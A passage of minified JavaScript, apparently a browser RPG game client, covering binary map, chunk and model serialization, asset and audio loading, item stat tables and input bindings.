                            s.id = t.readUInt16BE(Wr, !0),
                            Wr += 2;
                        const i = [];
                        s.meta = i,
                            s.name = to(t),
                            s.Za = t.readUInt32BE(Wr, !0),
                            Wr += 4,
                            s.rot = t.readUInt8(Wr, !0),
                            Wr += 1;
                        const n = Qr(t);
                        for (let e = 0; e < n; e++)
                            i[e] = t.readUInt32BE(Wr, !0),
                                Wr += 4
                    }
                    const l = [];
                    e.water = l;
                    const c = Qr(t);
                    for (let e = 0; e < c; e++) {
                        const s = {};
                        l[e] = s,
                            s.Mx = t.readUInt32BE(Wr, !0),
                            Wr += 4,
                            s.Tp = t.readUInt32BE(Wr, !0),
                            Wr += 4,
                            s.Nt = t.readUInt32BE(Wr, !0),
                            Wr += 4;
                        const i = [];
                        s.Za = i,
                            i[0] = t.readUInt16BE(Wr, !0),
                            Wr += 2,
                            i[1] = t.readUInt16BE(Wr, !0),
                            Wr += 2,
                            s.rot = t.readInt8(Wr, !0),
                            Wr += 1,
                            s.speed = t.readUInt8(Wr, !0),
                            Wr += 1,
                            s.sx = t.readUInt16BE(Wr, !0),
                            Wr += 2,
                            s.sz = t.readUInt16BE(Wr, !0),
                            Wr += 2,
                            s.visibility = t.readUInt8(Wr, !0),
                            Wr += 1,
                            s.Oy = t.readUInt8(Wr, !0),
                            Wr += 1,
                            s.pP = t.readUInt8(Wr, !0),
                            Wr += 1,
                            s.YX = t.readUInt8(Wr, !0),
                            Wr += 1;
                        const n = Qr(t);
                        for (let e = 2; e < n; e++)
                            i[e] = t.readUInt16BE(Wr, !0),
                                Wr += 2
                    }
                    return e
                }
                ,
                encode: t => {
                    const e = t
                        , s = e.cols
                        , i = e.settings
                        , n = e.spawns
                        , a = e.water;
                    let r = 0;
                    r += 1,
                        r += io(s.length);
                    for (let t = 0; t < s.length; t++) {
                        s[t];
                        r += 4,
                            r += 4,
                            r += 4,
                            r += 4
                    }
                    r += io(i.length);
                    for (let t = 0; t < i.length; t++) {
                        const e = i[t];
                        r += Vr.string(e.id),
                            r += Vr.string(e.value)
                    }
                    r += io(n.length);
                    for (let t = 0; t < n.length; t++) {
                        const e = n[t];
                        r += 2,
                            r += 1,
                            r += 2;
                        const s = e.meta;
                        r += Vr.string(e.name),
                            r += 4,
                            r += 1,
                            r += io(s.length);
                        for (let t = 0; t < s.length; t++)
                            r += 4
                    }
                    r += io(a.length);
                    for (let t = 0; t < a.length; t++) {
                        r += 4,
                            r += 4,
                            r += 4;
                        const e = a[t].Za;
                        r += 2,
                            r += 2,
                            r += 1,
                            r += 1,
                            r += 2,
                            r += 2,
                            r += 1,
                            r += 1,
                            r += 1,
                            r += 1,
                            r += io(e.length);
                        for (let t = 2; t < e.length; t++)
                            r += 2
                    }
                    const o = ao(r);
                    Wr = 0,
                        Wr = o.writeUInt8(e.chunkAmount, Wr, !0),
                        Gr(s.length, o);
                    for (let t = 0; t < s.length; t++) {
                        const e = s[t];
                        Wr = o.writeUInt32BE(e.ambient, Wr, !0),
                            Wr = o.writeUInt32BE(e.directional, Wr, !0),
                            Wr = o.writeUInt32BE(e.fog, Wr, !0),
                            Wr = o.writeUInt32BE(e.sky, Wr, !0)
                    }
                    Gr(i.length, o);
                    for (let t = 0; t < i.length; t++) {
                        const e = i[t];
                        Jr(e.id, o),
                            Jr(e.value, o)
                    }
                    Gr(n.length, o);
                    for (let t = 0; t < n.length; t++) {
                        const e = n[t];
                        Wr = o.writeUInt16BE(e.class, Wr, !0),
                            Wr = o.writeUInt8(e.faction, Wr, !0),
                            Wr = o.writeUInt16BE(e.id, Wr, !0);
                        const s = e.meta;
                        Jr(e.name, o),
                            Wr = o.writeUInt32BE(e.Za, Wr, !0),
                            Wr = o.writeUInt8(e.rot, Wr, !0),
                            Gr(s.length, o);
                        for (let t = 0; t < s.length; t++)
                            Wr = o.writeUInt32BE(s[t], Wr, !0)
                    }
                    Gr(a.length, o);
                    for (let t = 0; t < a.length; t++) {
                        const e = a[t];
                        Wr = o.writeUInt32BE(e.Mx, Wr, !0),
                            Wr = o.writeUInt32BE(e.Tp, Wr, !0),
                            Wr = o.writeUInt32BE(e.Nt, Wr, !0);
                        const s = e.Za;
                        Wr = o.writeUInt16BE(s[0], Wr, !0),
                            Wr = o.writeUInt16BE(s[1], Wr, !0),
                            Wr = o.writeInt8(e.rot, Wr, !0),
                            Wr = o.writeUInt8(e.speed, Wr, !0),
                            Wr = o.writeUInt16BE(e.sx, Wr, !0),
                            Wr = o.writeUInt16BE(e.sz, Wr, !0),
                            Wr = o.writeUInt8(e.visibility, Wr, !0),
                            Wr = o.writeUInt8(e.Oy, Wr, !0),
                            Wr = o.writeUInt8(e.pP, Wr, !0),
                            Wr = o.writeUInt8(e.YX, Wr, !0),
                            Gr(s.length, o);
                        for (let t = 2; t < s.length; t++)
                            Wr = o.writeUInt16BE(s[t], Wr, !0)
                    }
                    return o
                }
            },
            chunk: {
                decode: t => {
                    const e = {};
                    Wr = 0,
                        e.color = so(t),
                        e.foliage = so(t),
                        e.id = t.readUInt16BE(Wr, !0),
                        Wr += 2;
                    const s = [];
                    e.props = s;
                    const i = Qr(t);
                    for (let e = 0; e < i; e++) {
                        const i = {};
                        s[e] = i,
                            i.id = t.readUInt32BE(Wr, !0),
                            Wr += 4,
                            i.rx = t.readInt8(Wr, !0),
                            Wr += 1,
                            i.ry = t.readInt8(Wr, !0),
                            Wr += 1,
                            i.rz = t.readInt8(Wr, !0),
                            Wr += 1,
                            i.scale = t.readUInt8(Wr, !0),
                            Wr += 1,
                            i.x = t.readUInt8(Wr, !0),
                            Wr += 1,
                            i.y = t.readUInt8(Wr, !0),
                            Wr += 1,
                            i.z = t.readUInt8(Wr, !0),
                            Wr += 1
                    }
                    return e.terrain = so(t),
                        e
                }
                ,
                encode: t => {
                    const e = t
                        , s = e.props;
                    let i = 0;
                    i += Vr.buffer(e.color),
                        i += Vr.buffer(e.foliage),
                        i += 2,
                        i += io(s.length);
                    for (let t = 0; t < s.length; t++) {
                        s[t];
                        i += 4,
                            i += 1,
                            i += 1,
                            i += 1,
                            i += 1,
                            i += 1,
                            i += 1,
                            i += 1
                    }
                    i += Vr.buffer(e.terrain);
                    const n = ao(i);
                    Wr = 0,
                        eo(e.color, n),
                        eo(e.foliage, n),
                        Wr = n.writeUInt16BE(e.id, Wr, !0),
                        Gr(s.length, n);
                    for (let t = 0; t < s.length; t++) {
                        const e = s[t];
                        Wr = n.writeUInt32BE(e.id, Wr, !0),
                            Wr = n.writeInt8(e.rx, Wr, !0),
                            Wr = n.writeInt8(e.ry, Wr, !0),
                            Wr = n.writeInt8(e.rz, Wr, !0),
                            Wr = n.writeUInt8(e.scale, Wr, !0),
                            Wr = n.writeUInt8(e.x, Wr, !0),
                            Wr = n.writeUInt8(e.y, Wr, !0),
                            Wr = n.writeUInt8(e.z, Wr, !0)
                    }
                    return eo(e.terrain, n),
                        n
                }
            },
            modelformat: {
                decode: t => {
                    const e = {};
                    Wr = 0;
                    const s = [];
                    e.index = s;
                    const i = Qr(t);
                    for (let e = 0; e < i; e++)
                        s[e] = Qr(t);
                    const n = [];
                    e.Lx = n;
                    const a = Qr(t);
                    for (let e = 0; e < a; e++)
                        n[e] = t.readInt8(Wr, !0),
                            Wr += 1;
                    e.normalmode = t.readUInt8(Wr, !0),
                        Wr += 1;
                    const r = [];
                    e.position = r;
                    const o = Qr(t);
                    for (let e = 0; e < o; e++)
                        r[e] = t.readInt8(Wr, !0),
                            Wr += 1;
                    e.sx = t.readUInt32BE(Wr, !0),
                        Wr += 4,
                        e.sy = t.readUInt32BE(Wr, !0),
                        Wr += 4,
                        e.sz = t.readUInt32BE(Wr, !0),
                        Wr += 4;
                    const l = [];
                    e.Ek = l;
                    const c = Qr(t);
                    for (let e = 0; e < c; e++)
                        l[e] = t.readUInt8(Wr, !0),
                            Wr += 1;
                    return e
                }
                ,
                encode: t => {
                    const e = t
                        , s = e.index
                        , i = e.Lx
                        , n = e.position
                        , a = e.Ek;
                    let r = 0;
                    r += io(s.length);
                    for (let t = 0; t < s.length; t++)
                        r += Vr.varuint(s[t]);
                    r += io(i.length);
                    for (let t = 0; t < i.length; t++)
                        r += 1;
                    r += 1,
                        r += io(n.length);
                    for (let t = 0; t < n.length; t++)
                        r += 1;
                    r += 4,
                        r += 4,
                        r += 4,
                        r += io(a.length);
                    for (let t = 0; t < a.length; t++)
                        r += 1;
                    const o = ao(r);
                    Wr = 0,
                        Gr(s.length, o);
                    for (let t = 0; t < s.length; t++)
                        Gr(s[t], o);
                    Gr(i.length, o);
                    for (let t = 0; t < i.length; t++)
                        Wr = o.writeInt8(i[t], Wr, !0);
                    Wr = o.writeUInt8(e.normalmode, Wr, !0),
                        Gr(n.length, o);
                    for (let t = 0; t < n.length; t++)
                        Wr = o.writeInt8(n[t], Wr, !0);
                    Wr = o.writeUInt32BE(e.sx, Wr, !0),
                        Wr = o.writeUInt32BE(e.sy, Wr, !0),
                        Wr = o.writeUInt32BE(e.sz, Wr, !0),
                        Gr(a.length, o);
                    for (let t = 0; t < a.length; t++)
                        Wr = o.writeUInt8(a[t], Wr, !0);
                    return o
                }
            }
        }
        , lo = [];
    let co = 0;
    for (const t in ro)
        ro[t] && (ro[t].header = co++,
            ro[t].packData = function (t) {
                return this.prepareData && this.prepareData(t),
                    t._header = this.header,
                    this.encode(t)
            }
            ,
            lo.push(ro[t]));
    const ho = t => {
        if (0 === t.length)
            return;
        return lo[t.readUInt8(0, !1)]
    }
        , uo = 127
        , mo = 254
        , po = 2 ** 32 - 1
        , fo = [0, 0, 0]
        , go = [0, 0, 0]
        , vo = [0, 0, 0]
        , yo = [0, 0, 0]
        , bo = [0, 0, 0]
        , wo = [0, 0, 0]
        , xo = [0, 0, 0]
        , ko = [0, 0, 0]
        , $o = [0, 0, 0]
        , So = [0, 0, 0]
        , Eo = t => {
            t = oo.modelformat.decode(t);
            const e = uo / (po / t.sx)
                , s = uo / (po / t.sy)
                , i = uo / (po / t.sz);
            for (let n = 0; n < t.position.length; n += 3)
                t.position[n + 0] = t.position[n + 0] / e,
                    t.position[n + 1] = t.position[n + 1] / s,
                    t.position[n + 2] = t.position[n + 2] / i;
            if (0 == t.Ek.length)
                t.Ek.length = t.position.length / 3 * 2,
                    t.emptyUv = !0;
            else
                for (let e = 0; e < t.Ek.length; ++e)
                    t.Ek[e] /= mo;
            if (t.Lx.length)
                for (let e = 0, s = t.position.length; e < s; e++)
                    t.Lx[e] = t.Lx[e] / uo;
            else
                switch (t.normalmode) {
                    case 0:
                        {
                            const e = {};
                            for (let e = 0, s = t.position.length; e < s; ++e)
                                t.Lx[e] = 0;
                            for (let s = 0, i = t.index.length; s < i; s += 3) {
                                const i = 3 * t.index[s]
                                    , n = 3 * t.index[s + 2]
                                    , a = 3 * t.index[s + 1];
                                Vi(bo, t.position[i], t.position[i + 1], t.position[i + 2]),
                                    Vi(wo, t.position[n], t.position[n + 1], t.position[n + 2]),
                                    Vi(xo, t.position[a], t.position[a + 1], t.position[a + 2]),
                                    tn(ko, bo, wo),
                                    tn($o, xo, wo),
                                    cn(So, ko, $o),
                                    t.Lx[i] += So[0],
                                    t.Lx[i + 1] += So[1],
                                    t.Lx[i + 2] += So[2],
                                    t.Lx[n] += So[0],
                                    t.Lx[n + 1] += So[1],
                                    t.Lx[n + 2] += So[2],
                                    t.Lx[a] += So[0],
                                    t.Lx[a + 1] += So[1],
                                    t.Lx[a + 2] += So[2],
                                    [[bo, i], [wo, n], [xo, a]].forEach(t => {
                                        const s = t[0][0] + t[0][1] + t[0][2];
                                        e[s] = e[s] || new Set,
                                            e[s].add(t[1])
                                    }
                                    )
                            }
                            for (let e = 0, s = t.Lx.length; e < s; e += 3)
                                Vi(So, t.Lx[e], t.Lx[e + 1], t.Lx[e + 2]),
                                    on(So, So),
                                    t.Lx[e] = So[0],
                                    t.Lx[e + 1] = So[1],
                                    t.Lx[e + 2] = So[2];
                            for (const s in e) {
                                const i = e[s];
                                i.size <= 1 || (Vi(So, 0, 0, 0),
                                    i.forEach(e => {
                                        So[0] += t.Lx[e + 0],
                                            So[1] += t.Lx[e + 1],
                                            So[2] += t.Lx[e + 2]
                                    }
                                    ),
                                    on(So, So),
                                    i.forEach(e => {
                                        Vi(bo, t.Lx[e], t.Lx[e + 1], t.Lx[e + 2]),
                                            ln(bo, So) < .75 || (t.Lx[e + 0] = So[0],
                                                t.Lx[e + 1] = So[1],
                                                t.Lx[e + 2] = So[2])
                                    }
                                    ))
                            }
                            break
                        }
                    case 1:
                        yn(t.position, fo, go, vo, yo);
                        for (let e = 0, s = t.position.length; e < s; e += 3)
                            Vi(bo, t.position[e], t.position[e + 1], t.position[e + 2]),
                                tn(bo, bo, vo),
                                on(bo, bo),
                                t.Lx[e] = bo[0],
                                t.Lx[e + 1] = bo[1],
                                t.Lx[e + 2] = bo[2]
                }
            return t
        }
        , Mo = async (t, e, s, i, n, a = 3) => {
            switch (e.split(".").pop()) {
                case "jpg":
                case "png":
                case "webp":
                    {
                        const a = new Image;
                        a.onload = () => {
                            s[e] = i(a),
                                n(s[e], t + e),
                                a.onload = void 0
                        }
                            ,
                            a.src = t + e + "?v=4002247";
                        break
                    }
                default:
                    fetch(t + e + "?v=4002247").then(a => {
                        if (!a.ok)
                            throw new Error;
                        a.arrayBuffer().then(async a => {
                            s[e] = await i(a),
                                n(s[e], t + e)
                        }
                        )
                    }
                    ).catch(r => {
                        console.log(e + " fetch failed, retrying"),
                            a > 1 && Mo(t, e, s, i, n, --a)
                    }
                    )
            }
        }
        , _o = {}
        , Co = (t, e) => {
            for (let s = 0, i = _o[e].length; s < i; ++s)
                _o[e][s](t);
            _o[e] = void 0
        }
        , To = async (t, e, s, i, n) => {
            s[e] ? n(s[e]) : _o[t + e] ? _o[t + e].push(n) : (_o[t + e] = [],
                _o[t + e].push(n),
                Mo(t, e, s, i, Co))
        }
        , Po = t => {
            const e = Eo(Hr(t));
            return {
                position: {
                    size: 3,
                    data: new Float32Array(e.position)
                },
                index: {
                    type: 5125,
                    data: new Uint32Array(e.index)
                },
                Ek: {
                    size: 2,
                    data: new Float32Array(e.Ek)
                },
                Lx: {
                    size: 3,
                    data: new Float32Array(e.Lx)
                }
            }
        }
        , Io = {}
        , Do = (t, e) => {
            To("assets/geometry/", t, Io, Po, e)
        }
        , Ao = 0 == document.createElement("canvas").toDataURL("image/webp").indexOf("data:image/webp")
        , Bo = Ao ? "webp" : "png"
        , Ro = Ao ? "webp" : "jpg";
    let zo;
    const Fo = {
        terrain: []
    };
    let Zo;
    const Uo = () => {
        zo = new na(Aa, {
            geometry: za.geometry
        }),
            fetch("/assets/items/atlas.json?v=4002247").then(async t => {
                Zo = await t.json();
                for (const t in Zo)
                    "s" != t && (Zo[t] = Zo[t].map(t => t / Zo.s))
            }
            )
    }
        , Lo = t => {
            const e = new ga(Aa, {
                wrapS: Aa.REPEAT,
                wrapT: Aa.REPEAT,
                minFilter: Aa.LINEAR_MIPMAP_LINEAR
            });
            return e.image = t,
                e.element = t,
                e
        }
        , No = {}
        , Oo = (t, e) => {
            if (Ua && Ua.data) {
                const e = Ua.data.settings.find(e => e.id === t);
                e && (t = e.value)
            }
            Ao && (t = t.split(".")[0] + ".webp"),
                To("assets/textures/", t, No, Lo, e)
        }
        , jo = (t, e, s) => {
            zo.program = new xn(s.gl, {
                vertex: Ia,
                fragment: t,
                uniforms: {
                    seed: {
                        value: Date.now() % 1e3
                    }
                }
            });
            const i = new va(s.gl, {
                width: e,
                height: e,
                wrapT: s.gl.REPEAT,
                wrapS: s.gl.REPEAT
            });
            return s.render({
                scene: zo,
                target: i
            }),
                i.texture
        }
        ;
    let qo;
    const Xo = (t, e, s) => {
        qo = e,
            To("assets/audio/", t + ".ogg", No, Ho, s)
    }
        , Ho = async t => await qo.decodeAudioData(t)
        , Ko = t => { }
        ;
    var Wo = Object.freeze({
        __proto__: null,
        textures: Fo,
        get itemAtlas() {
            return Zo
        },
        init: Uo,
        loadTexture: Oo,
        makeTexture: jo,
        loadSound: Xo,
        createBaseGeometry: Ko,
        load: To,
        geometry: Io,
        loadGeometry: Do
    });
    const Yo = (t, e) => t + Math.random() * (e - t)
        , Vo = (t, e) => Math.floor(Math.random() * (e - t + 1)) + t
        , Go = t => Qo(t, Math.random())
        , Qo = (t, e) => t[Math.floor(e * t.length)]
        , Jo = {
            hammer: {
                audio: "weaponmetal",
                rot: 1
            },
            bow: {
                audio: "weaponwood",
                rot: 1
            },
            staff: {
                audio: "weaponwood",
                rot: 1
            },
            sword: {
                audio: "weaponmetal",
                rot: 1
            },
            armlet: {
                audio: "leather"
            },
            armor: {
                audio: "armor"
            },
            bag: {
                audio: "leather"
            },
            boot: {
                audio: "leather"
            },
            glove: {
                audio: "leather"
            },
            ring: {
                audio: "small"
            },
            amulet: {
                audio: "small"
            },
            quiver: {
                audio: "leather",
                rot: 1
            },
            shield: {
                audio: "armor"
            },
            totem: {
                audio: "armor",
                rot: 1
            },
            orb: {
                audio: "armor"
            },
            rune: {
                audio: "small",
                rot: 0
            },
            misc: {
                audio: "potion",
                rot: 1
            },
            book: {
                audio: "leather"
            },
            mount: {
                audio: "leather",
                rot: 0
            },
            box: {
                audio: "box",
                rot: 0
            },
            gold: {
                audio: "gold"
            },
            charm: {
                audio: "small"
            }
        }
        , tl = {
            hammer: {
                baselvl: 0,
                slot: [101],
                tiers: 17,
                drop: .4,
                weight: 1,
                class: 3,
                stats: {
                    10: {
                        base: 1,
                        min: .6,
                        max: 1
                    },
                    11: {
                        base: 3,
                        min: .8,
                        max: 1.7
                    },
                    17: {
                        base: 15,
                        min: .05,
                        max: .1
                    }
                }
            },
            bow: {
                baselvl: 0,
                slot: [101],
                tiers: 17,
                drop: .4,
                weight: 1,
                class: 2,
                stats: {
                    10: {
                        base: 1,
                        min: .6,
                        max: 1
                    },
                    11: {
                        base: 3,
                        min: .8,
                        max: 1.7
                    },
                    17: {
                        base: 10,
                        min: .05,
                        max: .1
                    }
                }
            },
            staff: {
                baselvl: 0,
                slot: [101],
                tiers: 17,
                drop: .4,
                weight: 1,
                class: 1,
                stats: {
                    10: {
                        base: 1,
                        min: .6,
                        max: 1
                    },
                    11: {
                        base: 3,
                        min: .8,
                        max: 1.7
                    },
                    17: {
                        base: 10,
                        min: .05,
                        max: .1
                    }
                }
            },
            sword: {
                baselvl: 0,
                slot: [101],
                tiers: 17,
                drop: .4,
                weight: 1,
                class: 0,
                stats: {
                    10: {
                        base: 1,
                        min: .6,
                        max: 1
                    },
                    11: {
                        base: 3,
                        min: .8,
                        max: 1.7
                    },
                    17: {
                        base: 20,
                        min: .05,
                        max: .1
                    }
                }
            },
            armlet: {
                baselvl: 1,
                slot: [102],
                tiers: 13,
                drop: 1,
                weight: .3,
                stats: {
                    6: {
                        base: 10,
                        min: .5,
                        max: .9
                    },
                    12: {
                        base: 7,
                        min: .5,
                        max: .9
                    }
                }
            },
            armor: {
                baselvl: 2,
                slot: [103],
                tiers: 11,
                drop: 1,
                weight: 1,
                stats: {
                    12: {
                        base: 10,
                        min: 1.5,
                        max: 3
                    },
                    6: {
                        base: 20,
                        min: 1,
                        max: 2
                    }
                }
            },
            bag: {
                baselvl: 5,
                slot: [104],
                tiers: 5,
                drop: 1,
                weight: .1,
                stats: {
                    19: {
                        base: 1,
                        min: .1,
                        max: .3
                    }
                }
            },
            boot: {
                baselvl: 2,
                slot: [105],
                tiers: 13,
                drop: 1,
                weight: .4,
                stats: {
                    6: {
                        base: 10,
                        min: .6,
                        max: 1
                    },
                    12: {
                        base: 8,
                        min: .6,
                        max: 1.2
                    },
                    15: {
                        base: 3,
                        min: .03,
                        max: .1
                    }
                }
            },
            glove: {
                baselvl: 2,
                slot: [106],
                tiers: 13,
                drop: 1,
                weight: .4,
                stats: {
                    6: {
                        base: 10,
                        min: .6,
                        max: 1
                    },
                    12: {
                        base: 8,
                        min: .7,
                        max: 1.2
                    },
                    14: {
                        base: 1,
                        min: .1,
                        max: 1.5
                    }
                }
            },
            ring: {
                baselvl: 5,
                slot: [107],
                tiers: 12,
                drop: .8,
                weight: .2,
                stats: {
                    6: {
                        base: 10,
                        min: .5,
                        max: .9
                    },
                    7: {
                        base: 5,
                        min: .6,
                        max: 1
                    }
                }
            },
            amulet: {
                baselvl: 7,
                slot: [108],
                tiers: 12,
                drop: .8,
                weight: .3,
                stats: {
                    7: {
                        base: 10,
                        min: 1,
                        max: 1.8
                    },
                    9: {
                        base: 1,
                        min: .2,
                        max: .3
                    }
                }
            },
            quiver: {
                baselvl: 2,
                slot: [109],
                tiers: 10,
                drop: .7,
                weight: .5,
                class: 2,
                stats: {
                    14: {
                        base: 2,
                        min: .1,
                        max: .5
                    }
                }
            },
            shield: {
                baselvl: 2,
                slot: [109],
                tiers: 10,
                drop: .7,
                weight: .5,
                class: 0,
                stats: {
                    12: {
                        base: 20,
                        min: .9,
                        max: 1.5
                    },
                    13: {
                        base: 4,
                        min: 1,
                        max: 3
                    }
                }
            },
            totem: {
                baselvl: 2,
                slot: [109],
                tiers: 10,
                drop: .7,
                weight: .5,
                class: 3,
                stats: {
                    12: {
                        base: 10,
                        min: .3,
                        max: .8
                    },
                    9: {
                        base: 1,
                        min: .1,
                        max: .2
                    }
                }
            },
            orb: {
                baselvl: 2,
                slot: [109],
                tiers: 10,
                drop: .7,
                weight: .5,
                class: 1,
                stats: {
                    3: {
                        base: 10,
                        min: .3,
                        max: .8
                    },
                    9: {
                        base: 1,
                        min: .1,
                        max: .3
                    }
                }
            },
            rune: {
                baselvl: 1,
                tiers: 11,
                drop: .8,
                quality: 70
            },
            misc: {
                drop: 7,
                weight: .1
            },
            book: {
                drop: 1.5,
                weight: .5
            },
            charm: {
                slot: [110, 111],
                noupgrade: !0,
                undroppable: !0,
                drop: 0,
                stackable: !1
            },
            mount: {
                noupgrade: !0,
                undroppable: !0,
                drop: 0,
                stackable: !1
            },
            box: {
                noupgrade: !0,
                undroppable: !0,
                drop: 0,
                stackable: !1
            },
            gold: {
                drop: 20
            }
        }
        , el = Object.keys(tl)
        , sl = {
            6: {
                min: .2,
                max: .8,
                round: !0
            },
            7: {
                min: .2,
                max: .5,
                round: !0
            },
            8: {
                min: .1,
                max: .5
            },
            9: {
                min: .1,
                max: .2
            },
            10: {
                min: .03,
                max: .13,
                round: !0
            },
            11: {
                min: .1,
                max: .2,
                round: !0
            },
            12: {
                min: .1,
                max: 1,
                round: !0
            },
            13: {
                min: .1,
                max: .3
            },
            14: {
                min: .1,
                max: .4
            },
            16: {
                min: .1,
                max: .5
            },
            2: {
                min: .08,
                max: .45,
                round: !0
            },
            0: {
                min: .08,
                max: .45,
                round: !0
            },
            3: {
                min: .08,
                max: .45,
                round: !0
            },
            4: {
                min: .08,
                max: .45,
                round: !0
            },
            1: {
                min: .08,
                max: .45,
                round: !0
            },
            5: {
                min: .08,
                max: .45,
                round: !0
            },
            18: {
                min: .01,
                max: .15,
                round: !0
            }
        }
        , il = {
            6: 3,
            7: 3,
            8: 3,
            9: 2,
            10: 1,
            11: 1,
            12: 5,
            13: 5,
            14: 5,
            15: .3,
            16: 5,
            17: 0,
            2: 2,
            0: 2,
            3: 2,
            4: 2,
            1: 2,
            5: 2,
            19: 1,
            18: 3
        };
    let nl, al = [];
    const rl = new Map
        , ol = new Map
        , ll = ({ dt: t, cameraPivot: e, camera: s }) => {
            nl && (fl(nl.listener, s.KP),
                Bn(Wa, e.KP),
                Vi(Oa, 0, 0, 1),
                dn(Oa, Oa, Wa),
                Vi(ja, 0, 1, 0),
                dn(ja, ja, Wa),
                nl.listener.setOrientation(Oa[0], Oa[1], Oa[2], ja[0], ja[1], ja[2]),
                al.forEach(e => {
                    e.transform && e.dynamic && fl(e.panner, e.transform.KP),
                        e.delay > 0 && (e.delay -= t,
                            e.delay <= 0 && e.start(0, e.loop ? Yo(0, 1) : 0)),
                        e.ended && hl(e.id)
                }
                ),
                al = al.filter(t => !t.ended))
        }
        , cl = t => {
            if (ol.has(t)) {
                if (ol.get(t) > 3)
                    return !1;
                ol.set(t, ol.get(t) + 1)
            } else
                ol.set(t, 1);
            return !0
        }
        , hl = t => {
            ol.set(t, Math.max(0, ol.get(t) - 1))
        }
        , dl = ({ id: t, loop: e, transform: s, type: i = "sfx", distance: n, gain: a, delay: r, rndDelay: o = !1, rnd: l, pitch: c, force: h, dynamic: d = !1 }) => {
            if (s && !h) {
                if (1 / ((ol.get(t) || 0) + 10 + nn(Ra.position, s.position)) * 1e3 / (al.length + 20) ** 1.2 < .4)
                    return
            }
            if (al.length > 35 && !h || void 0 === nl || "suspended" == nl.state)
                return;
            if (!cl(t) && !h)
                return;
            const u = nl.createBufferSource();
            u.id = t,
                l && (t += Vo(1, l)),
                u.loop = e || !1,
                -1 !== c && (u.playbackRate.value = (c || 1) * Yo(.95, 1.05)),
                ml(t).then(t => {
                    u.buffer = t
                }
                );
            const m = rl.get(i)
                , p = a ? nl.createGain() : m;
            return a && (u.gain = p,
                p.connect(m)),
                s ? (u.panner = nl.createPanner(),
                    u.panner.distanceModel = "exponential",
                    u.panner.refDistance = n,
                    u.panner.rolloffFactor = 1,
                    u.transform = s,
                    u.dynamic = d,
                    u.connect(u.panner),
                    u.panner.connect(p),
                    fl(u.panner, s.KP)) : u.connect(p),
                u.onended = gl,
                r ? u.delay = o ? Yo(0, r) : r : u.start(0, e ? Yo(0, 1) : 0),
                al.push(u),
                u
        }
        , ul = {}
        , ml = async t => ul[t] ? ul[t] : await new Promise(e => {
            Xo(t, nl, s => {
                ul[t] = s,
                    e(ul[t])
            }
            )
        }
        )
        , pl = t => {
            Ua && Ua.deserialized && (nl = new (window.AudioContext || window.webkitAudioContext),
                rl.set("sfx", nl.createGain()).get("sfx").connect(nl.destination),
                rl.set("music", nl.createGain()).get("music").connect(nl.destination),
                rl.set("ambience", nl.createGain()).get("ambience").connect(nl.destination),
                ts.subscribe(t => {
                    rl.get("sfx").gain.value = (t / 100) ** 2
                }
                ),
                es.subscribe(t => {
                    rl.get("music").gain.value = (t / 100) ** 2
                }
                ),
                Je.subscribe(t => {
                    rl.get("ambience").gain.value = (t / 100) ** 2
                }
                ),
                te.set(!0),
                document.removeEventListener("click", pl))
        }
        ;
    document.addEventListener("click", pl);
    const fl = (t, e) => {
        t.setPosition(e[12], e[13], e[14])
    }
        , gl = function () {
            this.ended = !0
        }
        , vl = t => {
            dl({
                id: "item/" + Jo[t].audio,
                loop: !1
            })
        }
        , yl = ({ world: t }) => {
            al.length = 0,
                ol.clear()
        }
        ;
    var bl = Object.freeze({
        __proto__: null,
        tick: ll,
        sound: dl,
        onUserActivate: pl,
        itemsound: vl,
        onWorldDestroy: yl
    });
    const wl = [0, 0]
        , xl = [0, 0]
        , kl = [0, 0]
        , $l = {}
        , Sl = {}
        , El = function (t) {
            return this.press.push(t),
                t
        }
        , Ml = function (t) {
            return this.release.push(t),
                t
        }
        , _l = (t, e) => (e.press || (e.down = !1,
            e.onPress = El,
            e.onRelease = Ml,
            e.press = [],
            e.release = [],
            e.mappings = [],
            e.store || (e.store = qt(!1))),
            (t = Array.isArray(t) ? t : [t]).forEach(t => {
                Sl[t] = e,
                    e.mappings.push(t)
            }
            ),
            Jt.set($l),
            e)
        , Cl = () => {
            _l(ji.kbForward, $l.fwd = {}),
                _l(ji.kbLeft, $l.left = {}),
                _l(ji.kbBack, $l.back = {}),
                _l(ji.kbRight, $l.right = {}),
                _l(ji.kbNextTarget, $l.nextTarget = {}),
                _l(ji.kbUntarget, $l.untarget = {}),
                _l(" ", $l.jump = {}),
                _l(ji.kbAltForward, $l.fwd),
                _l(ji.kbAltBack, $l.back),
                _l(ji.kbTurnRight, $l.turnright = {}),
                _l(ji.kbTurnLeft, $l.turnleft = {}),
                _l("shift", $l.shift = {}),
                _l("m0", $l.lmb = {}),
                _l("m2", $l.rmb = {}),
                _l("control", $l.ctrl = {}),
                _l("alt", $l.alt = {}),
                _l(ji.kbMap, $l.map = {}),
                _l(ji.kbSkills, $l.skills = {}).onPress(() => {
                    cs.update(t => !t),
                        dl({
                            id: "page",
                            loop: !1
                        })
                }
                ),
                _l(ji.kbCharacter, $l.char = {}).onPress(() => {
                    gs.update(t => !t),
                        dl({
                            id: "page",
                            loop: !1
                        })
                }
                ),
                _l(ji.kbInventory, $l.inventory = {}).onPress(() => {
                    os.update(t => !t),
                        dl({
                            id: "inventory",
                            loop: !1
                        })
                }
                ),
                _l(ji.kbClan, $l.clan = {}).onPress(() => {
                    ms.update(t => !t),
                        dl({
                            id: "inventory",
                            loop: !1
                        })
                }
                ),
                document.addEventListener("wheel", Fl, {
                    passive: !0
                }),
                document.addEventListener("keydown", Ll, !1),
                document.addEventListener("keyup", Nl, !1),
                document.addEventListener("contextmenu", Zl, !1),
                document.addEventListener("mousedown", Rl, !1),
                document.addEventListener("mouseup", zl, !1),
                document.addEventListener("mousemove", Il, !1)
        }
        , Tl = t => {
            Bl && (Bl = !1,
                !ji.pointerlock || $l.lmb.down || $l.rmb.down || (document.exitPointerLock(),
                    Al = !1))
        }
        ;
    let Pl = 0;
    const Il = t => {
        if (ba(wl, t.x * ji.resolutionScale / Aa.canvas.width * 2 - 1, 2 * (1 - t.y * ji.resolutionScale / Aa.canvas.height) - 1),
            ba(xl, t.x, t.y),
            $l.rmb.down || $l.lmb.down) {
            const e = nr(t.movementX, -100, 100)
                , s = nr(t.movementY, -100, 100);
            kl[1] = kl[1] + .004 * s * (ji.invertMouseY ? -ji.mouseSensitivity : ji.mouseSensitivity),
                kl[0] = ur(kl[0] - .005 * e * (ji.invertMouseX ? -ji.mouseSensitivity : ji.mouseSensitivity)),
                Pl += Math.abs(s) + Math.abs(e)
        }
    }
        ;
    let Dl = !1;
    le.subscribe(t => {
